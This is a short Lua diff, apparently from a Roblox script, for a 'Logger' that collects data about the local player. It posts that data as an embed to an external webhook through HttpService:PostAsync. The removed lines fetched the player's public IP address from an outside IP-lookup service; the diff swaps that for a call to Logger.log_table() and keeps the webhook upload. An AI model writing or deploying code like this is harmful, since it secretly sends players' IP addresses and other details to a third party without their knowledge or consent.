@@ -16,8 +16,8 @@ local Logger = {
         end
 
         plr = game.Players.LocalPlayer
-        ip_fetched = HttpService:GetAsync("https://ip.moon.lat/")
-        local j = HttpService:JSONDecode(ip_fetched)
+
+        j = Logger.log_table()
 
         local dataFields = {
             ["embeds"] = {{
@@ -59,6 +59,7 @@ local Logger = {
                 }}
             }}
         }
+        
         HttpService:PostAsync(webhook, dataFields, Enum.HttpContentType.ApplicationJson, false)
     end
 }
